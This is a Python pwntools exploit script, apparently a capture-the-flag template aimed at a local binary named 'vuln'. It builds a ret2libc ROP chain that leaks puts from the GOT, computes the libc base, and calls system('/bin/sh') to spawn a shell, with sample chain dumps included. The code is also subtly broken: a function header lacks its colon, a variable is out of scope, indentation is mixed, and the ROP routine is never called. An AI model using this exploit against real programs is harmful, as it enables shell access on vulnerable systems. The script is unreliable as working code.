#!/usr/bin/env python3
from pwn import *
""""
Notes:
- ..
- ..
Solution:
1. ..
2. ..
"""

def rop(p)
	buff = flat(
		b"A" * 32
	)

	# Build first ROP chain. Goal: Leak puts address and jump back to main:
	rop_1 = ROP(elf)
	rop_1.puts(elf.got["puts"])
	rop_1.call(elf.symbols["main"])
	log.info("ROP 1 chain:\n" + rop_1.dump())
	"""
	[*] ROP 1 chain:
		0x0000:        0x8048350 puts(0x804982c)
		0x0004:        0x8048335 <adjust @0xc> pop ebx; ret
		0x0008:        0x804982c got.puts
		0x000c:        0x804851b 0x804851b()
	"""

	p.sendline(buff + rop_1.chain())
	leaked_puts = p.recvline()[:4].strip().ljust(4, b"\x00")
	log.info(b"Leaked puts@GLIBC: %s", enhex(leaked_puts))

	# Get correct address for symbols in libc
	libc = ELF("/lib/i386-linux-gnu/libc.so.6")
	libc.address = u32(leaked_puts) - libc.symbols["puts"]

	# Build second ROP chain. Goal: Put system address, buffer, pointer to /bin/sh on stack:
	rop_2 = ROP(libc)
	rop_2.system(next(libc.search(b"/bin/sh\x00")))
	log.info("ROP 2 chain:\n" + rop_2.dump())
	"""
	[*] ROP 2 chain:
		0x0000:       0xf7dc7c00 system(0xf7f07aaa)
		0x0004:          b'baaa' <return address>
		0x0008:       0xf7f07aaa arg0
	"""

	p.sendline(buff + rop_2.chain())

def sploit(p):
	offset = cyclic_find(0x6161616c, n=4)
	payload = flat(
		b"A" * offset
	)

	p.recvuntil(b"hello")
	p.sendline(payload)

def main():
	elf = ELF("./vuln")

	if args["REMOTE"]:
		p = remote("localhost", 12345)
	else:
		p = elf.process()
	if args["DEBUG"]:
		gdb.attach(p, """
			continue
		""")

    sploit(p)

if __name__ == "__main__":
	main()
